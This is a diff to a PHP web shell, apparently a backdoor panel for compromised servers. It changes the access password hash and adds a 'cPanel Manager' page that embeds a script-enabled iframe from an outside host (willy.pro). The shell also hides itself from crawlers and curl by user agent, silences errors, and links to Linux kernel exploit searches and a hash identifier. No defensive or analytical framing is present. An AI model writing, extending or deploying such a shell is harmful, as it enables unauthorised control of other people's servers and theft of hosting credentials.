@@ -3,7 +3,7 @@ session_start();
 @error_reporting(0);
 @set_time_limit(0);
 
-$hashedPassword = "48dd3046643b6bf08f2a6d9be1b0dd26"; 
+$hashedPassword = "5c5fa09440696b310b4b1750d49f84ca"; 
 
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
     $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
@@ -1013,6 +1013,12 @@ if ($_GET['don'] == true) {
                             </a>
                         </li>
                         <li>
+                            <a href="?d=<?= hx($fungsi[0]()) ?>&cpmanager" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
+                                <i class="fab fa-cpanel text-orange-400 mr-3 cyber-glow-warning"></i>
+                                <span>cPanel Manager</span>
+                            </a>
+                        </li>
+                        <li>
                             <a href="?d=<?= hx($fungsi[0]()) ?>&dbmanager" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                 <i class="fas fa-database text-blue-400 mr-3 cyber-glow"></i>
                                 <span>Database Manager</span>
@@ -1068,7 +1074,7 @@ if ($_GET['don'] == true) {
                             </a>
                         </li>
                         <li>
-                            <a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
+                            <a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" target="_blank" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                 <i class="fas fa-flask text-orange-400 mr-3 cyber-glow-warning"></i>
                                 <span>Linux Exploit</span>
                             </a>
@@ -1092,7 +1098,7 @@ if ($_GET['don'] == true) {
                             </a>
                         </li>
                         <li>
-                            <a href="//hashes.com/en/tools/hash_identifier" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
+                            <a href="//hashes.com/en/tools/hash_identifier" target="_blank" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                 <i class="fas fa-code text-cyan-400 mr-3 cyber-glow"></i>
                                 <span>Hash Identifier</span>
                             </a>
@@ -1441,6 +1447,22 @@ if ($_GET['don'] == true) {
                             </div>
                         </div>
                     </div>
+                    <?php elseif (isset($_GET['cpmanager'])): ?>
+                        <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
+                            <div class="flex items-center justify-between mb-4">
+                                <h2 class="text-xl font-bold cyber-font cyber-glow">
+                                    <i class="fab fa-cpanel text-orange-400 mr-2 cyber-glow-warning"></i>
+                                    cPanel Manager
+                                </h2>
+                                <div>
+                                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
+                                        <i class="fas fa-arrow-left mr-1"></i> Back
+                                    </a>
+                                </div>
+                            </div>
+                                <iframe src="//willy.pro/cpmanager.php" sandbox="allow-scripts allow-same-origin allow-top-navigation" allowtransparency="true" frameborder="0" width="100%" height="600px"></iframe>
+                        </div>
+
                     <?php elseif (isset($_GET['dbmanager'])): ?>
                     <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
                         <div class="flex items-center justify-between mb-4">
@@ -3550,3 +3572,4 @@ function perms($file)
     return $info;
 }
 ?>
+      
